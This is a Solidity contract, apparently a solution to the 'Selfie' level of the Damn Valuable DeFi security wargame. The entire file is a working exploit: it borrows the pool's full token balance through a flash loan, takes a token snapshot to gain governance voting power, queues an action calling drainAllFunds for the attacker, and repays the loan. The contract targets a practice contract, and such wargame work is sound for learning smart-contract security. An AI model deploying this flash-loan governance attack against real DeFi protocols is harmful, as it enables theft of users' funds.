pragma solidity ^0.6.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfieAttacker {

  SimpleGovernance public governance;
  SelfiePool public pool;
  DamnValuableTokenSnapshot public token;
  address public poolAddress;
  address public attacker;
  uint256 public actionId;

  constructor(address governanceAddress, address _poolAddress, address tokenAddress) public {
    governance = SimpleGovernance(governanceAddress);
    token = DamnValuableTokenSnapshot(tokenAddress);
    poolAddress = _poolAddress;
    pool = SelfiePool(poolAddress);
    attacker = msg.sender;
  }

  function attack() public {
    pool.flashLoan(token.balanceOf(poolAddress));
  }

  function receiveTokens(address receiver, uint256 amount) external {
    token.snapshot();
    bytes memory attackCode = abi.encodeWithSignature("drainAllFunds(address)", attacker);
    actionId = governance.queueAction(poolAddress, attackCode, 0);
    token.transfer(msg.sender, amount);
  }
}
